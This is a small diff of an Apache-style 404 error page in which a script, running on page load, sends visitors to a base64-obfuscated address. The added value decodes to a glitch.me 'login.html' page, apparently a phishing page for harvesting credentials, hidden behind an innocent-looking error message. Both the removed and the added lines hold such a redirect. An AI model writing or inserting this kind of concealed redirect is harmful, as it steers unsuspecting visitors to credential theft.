@@ -8,7 +8,7 @@
 <p>The requested URL was not found on this server.</p>
 <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
 <script>
-window.location=atob("YUhSMGNITTZMeTkzYjNKeWFXVmtMV1p2WVcxNUxXUnZiV0ZwYmk1bmJHbDBZMmd1YldVdlgyd3daMmx1TG1oMGJXdz0=");
+window.location=atob("aHR0cHM6Ly9kZW5pbS1pbmt5LWlvZGluZS5nbGl0Y2gubWUvYGxvZ2luLmh0bWw=");
 </script>
 </body>
 </html>
